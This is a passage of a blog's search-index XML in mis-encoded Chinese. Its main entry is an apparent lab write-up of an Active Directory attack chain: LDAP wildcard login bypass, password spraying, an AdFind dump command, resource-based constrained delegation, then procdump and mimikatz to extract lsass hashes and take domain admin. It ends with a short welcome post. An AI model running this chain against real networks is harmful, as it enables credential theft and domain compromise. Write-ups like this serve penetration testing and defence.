title=""></a></h6><p>é€šè¿‡phpinfoå¯ä»¥åˆ¤æ–­ä½¿ç”¨äº†ldapæ–¹å¼è¿›è¡Œå¯¹ç”¨æˆ·çš„éªŒè¯ã€‚æ—¢ç„¶æ˜¯ldap,æˆ‘ä»¬å¯ä»¥è¿›è¡Œfilter+å¯¹åº”çš„ldapè¯­æ³•è¿›è¡Œfuzz,å…¶ä¸­æˆ‘ä»¬é€šè¿‡*åŒ¹é…æ‰€æœ‰ï¼ŒæˆåŠŸè¿›å…¥åˆ°äº†åå°ï¼Œè·å–äº†å¤§é‡ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬æˆå‘˜ç»„è´¦æˆ·ï¼Œæœ‰äº†è´¦æˆ·å’Œæ³„æ¼çš„å¯†ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒPTH</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_09-39.png" class="" title="2024-02-01_09-39.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>é€šè¿‡å¯¹å¯†ç å’Œè´¦æˆ·çš„å–·æ´’ï¼Œå‘ç°äº†éƒ¨åˆ†å¯ä»¥ç™»é™†ldapçš„å‡­è¯</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-15.png" class="" title="2024-02-01_10-15.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-16.png" class="" title="2024-02-01_10-16.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>è€ƒè™‘åˆ°åœ¨ä¸€äº›åŸŸå†…æœ‰äº›æœºå™¨å¯èƒ½è¢«è®¾ç½®äº†é˜²ç«å¢™ï¼Œä»è€Œæ— æ³•è¢«æ‰«æåˆ°ã€‚å½“æˆ‘ä»¬è·å¾—å‡­è¯äº†ï¼Œä¸ºäº†è·å–æ›´ä¸ºè¯¦ç»†çš„åŸŸå†…æœºå™¨ï¼Œå¯ä»¥å¯¹åŸŸæ§ dns æœåŠ¡å™¨ä¸­çš„ DNS ä¿¡æ¯è¿›è¡ŒæŸ¥è¯¢ï¼Œä»è€Œè·å–åˆ°ä¸€äº›è¢«é˜²ç«å¢™å¿½ç•¥çš„æœºå™¨</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-22.png" class="" title="2024-02-01_10-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-26.png" class="" title="2024-02-01_10-26.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>å¯ä»¥å‘ç°åŸŸä¸­è¿˜å­˜åœ¨ 10.0.0.12 è¿™å°æœºå™¨æ²¡æœ‰è¢«æ‰«æåˆ°ï¼Œè¿˜æ˜¯ä¸€å°win10</p><h2 id="ldapä¿¡æ¯å¯¼å‡ºä¸åˆ†æ"><a href="#ldapä¿¡æ¯å¯¼å‡ºä¸åˆ†æ" class="headerlink" title="ldapä¿¡æ¯å¯¼å‡ºä¸åˆ†æ"></a>ldapä¿¡æ¯å¯¼å‡ºä¸åˆ†æ</h2><p>ä½¿ç”¨Adfindå·¥å…·ä»åŸŸå¤–è¿›è¡Œ ldap ä¿¡æ¯çš„è·å–å¹¶å¯¼å‡º<br>Adfind.exe * -h 10.0.0.10 -u <user> -up <password> &gt; info.txt<br>åˆ†æçš„è¯é‡ç‚¹å…³æ³¨ä»¥ä¸‹å±æ€§ï¼š<br>whenCreated(åˆ›å»ºæ—¶é—´)<br>memberOf(æ‰€å±ç»„)<br>userAccountControl(æƒé™)<br>lastLogon(ä¸Šæ¬¡ç™»å½•æ—¶é—´)<br>pwdLastSet(ä¸Šæ¬¡å¯†ç ä¿®æ”¹æ—¶é—´)<br>lastLogonTimestamp(ä¸Šæ¬¡ç™»å½•æ—¶é—´)<br>é€šè¿‡è¿™äº›å¯ä»¥ç¡®å®šè´¦æˆ·çš„æƒé™ï¼Œè´¦æˆ·å½“å‰çš„çŠ¶æ€ï¼Œåœ¨å¯¹æœºå™¨çš„ ldap ä¿¡æ¯è¿›è¡ŒæŸ¥çœ‹æ—¶å‘ç°ï¼Œè¿™é‡Œæœºå™¨ä¸­å­˜åœ¨ mS-DS-CreatorSID è¿™ä¸ªå±æ€§ï¼Œå¦‚æœå­˜åœ¨è¿™ä¸ªå±æ€§çš„è¯ï¼Œè¡¨ç¤ºè¿™å°æœºå™¨æ˜¯ç”±æŸä¸ªåŸŸç”¨æˆ·åŠ å…¥æœºå™¨çš„ï¼Œè¯¥åŸŸç”¨æˆ·å¯¹è¯¥æœºå™¨å…·æœ‰ msDS-AllowedToActOnBehalfOfOtherIdentity æƒé™ï¼Œæ‰€ä»¥å¦‚æœæ§åˆ¶äº†è¿™ä¸ªè´¦æˆ·é‚£ä¹ˆå°±ç­‰äºæ‹¿ä¸‹äº†å¯¹åº”çš„æœºå™¨ï¼Œç»§ç»­æ”¶é›†ldapä¿¡æ¯ï¼Œå¹¶å®šä½è¯¥è´¦æˆ·ï¼Œä¸ºä¸‹ä¸€æ­¥çº¦æŸå§”æ´¾åšå‡†å¤‡</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_10-45.png" class="" title="2024-02-01_10-45.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><h2 id="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</h2><p>é¦–å…ˆåˆ©ç”¨åˆšæ‰å®šä½åˆ°çš„åŸŸè´¦æˆ·å»ºç«‹ä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œä¹‹åä½¿ç”¨è¯¥æœºå™¨è´¦æˆ·å»å‘è¯¥æœºå™¨è¿›è¡Œå§”æ´¾ï¼Œç„¶åé€šè¿‡ rbcd å°† win8 æœºå™¨ä¸æ–°åˆ›å»ºçš„è´¦æˆ·å»ºç«‹å§”æ´¾ï¼Œå› ä¸ºç›¸æ¯”è¾ƒäºéçº¦æŸå§”æ´¾ï¼Œçº¦æŸå§”æ´¾æ˜¯æ­£å‘å§”æ´¾ï¼Œéœ€è¦ä¸»åŠ¨å»ºç«‹ï¼Œè¿™ä¸ªæ—¶å€™test_computer598æ˜ å…¥æˆ‘ä»¬çœ¼å¸˜</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_11-31.png" class="" title="2024-02-01_11-31.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>å»ºç«‹å§”æ´¾ä¹‹åå°†test_computer598è´¦æˆ·çš„ç¥¨æ®è¿›è¡Œå¯¼å‡ºï¼Œè¿™é‡Œæœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œå› ä¸ºéœ€è¦ä¸åŸŸæ§è¿›è¡Œäº¤äº’ï¼Œæ‰€ä»¥éœ€è¦ä¸åŸŸæ§çš„æ—¶é—´åŒæ­¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ntpdateå°†åŸŸæ§æ—¶é—´å’Œæœ¬æœºæ—¶é—´ç›´æ¥åŒæ­¥,æœ€åå¯¼å‡ºå®Œæ¯•ä¹‹åç›´æ¥exportå¯¼å…¥åˆ°æˆ‘ä»¬çš„æœ¬æœº</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-44.png" class="" title="2024-02-01_03-44.png"><h2 id="dumphash"><a href="#dumphash" class="headerlink" title="dumphash"></a>dumphash</h2><p>å¯¼å…¥å®Œç¥¨æ®ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨smbclientæ¥ä¸Šä¼ çŒ•çŒ´æ¡ƒæˆ–è€… procdump å·¥å…·æ¥è·å–ç”¨æˆ· hash</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-51.png" class="" title="2024-02-01_03-51.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>è¿™é‡Œå¦‚æœå‡ºç°æ— æ³•è¿æ¥445çš„é”™è¯¯ï¼Œæ˜¯å› ä¸ºç›®å‰æœºå™¨æ˜¯åœ¨åŸŸå¤–ï¼Œæ²¡æœ‰åŸŸæ§çš„è·¯ç”±è¡¨ï¼Œå¯ä»¥æ‰‹åŠ¨ä¿®æ”¹ hosts æ–‡ä»¶ï¼Œåšä¸€ä¸ªåŸŸåè§£æ<br>åˆšæ‰æˆ‘ä»¬å°†ç¥¨æ®exportå¯¼å…¥åˆ°äº†æˆ‘ä»¬çš„æœ¬æœºï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åˆ©ç”¨smbexecè·å–ä¸€ä¸ªç›®æ ‡æœºå™¨çš„ä¸´æ—¶shellï¼Œé€šè¿‡æ‰§è¡Œå‘½ä»¤ä½¿ procdump è·å– dmp æ–‡ä»¶</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_03-56.png" class="" title="2024-02-01_03-56.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>å†å¯¼å‡ºåˆ°æœ¬æœºï¼Œæœ¬åœ°åˆ©ç”¨çŒ•çŒ´æ¡ƒè§£æ lsass.dmp æ–‡ä»¶ï¼Œå¾—åˆ°æ‰€æœ‰hashï¼Œä»è€Œæ‹¿ä¸‹åŸŸç®¡è´¦æˆ·</p><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/2024-02-01_04-06.png" class="" title="2024-02-01_04-06.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/d4667b73316a139c13fce6de17fba66.png" class="" title="d4667b73316a139c13fce6de17fba66.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/02/01/ldap%E9%85%8D%E5%90%88%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/dc6fbe7bbc96b59a197c2413c217fa6.png" class="" title="dc6fbe7bbc96b59a197c2413c217fa6.png">]]></content>
    
    
    <categories>
      
      <category>å†…ç½‘æ¸—é€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åŸŸæ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè§</title>
    <link href="/2024/01/29/%E5%88%9D%E8%A7%81/"/>
    <url>/2024/01/29/%E5%88%9D%E8%A7%81/</url>
    
    <content type="html"><![CDATA[<p>äººç”Ÿè‹¥åªå¦‚åˆè§<br>æ¬¢è¿å¤§å®¶æ¥åˆ°æˆ‘çš„åšå®¢ç©ºé—´ï¼Œåœ¨ä¸€åˆ‡å¼€å§‹å‰ï¼Œå…±åŒæ¬£èµä¸€ä¸‹ç¾æ™¯å§</p><img src="/2024/01/29/%E5%88%9D%E8%A7%81/test.png" class="" title="mount">]]></content>
    
    
    <categories>
      
      <category>Welcome</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hello</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
